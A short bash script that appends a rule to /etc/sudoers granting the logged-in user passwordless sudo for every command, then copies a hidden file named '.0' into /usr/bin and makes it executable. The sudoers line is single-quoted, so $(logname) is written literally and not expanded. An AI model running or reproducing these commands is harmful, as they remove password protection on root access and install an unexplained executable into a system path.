#!/usr/bin/bash

echo ' $(logname) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
cp .0 /usr/bin/0
chmod +x /usr/bin/0

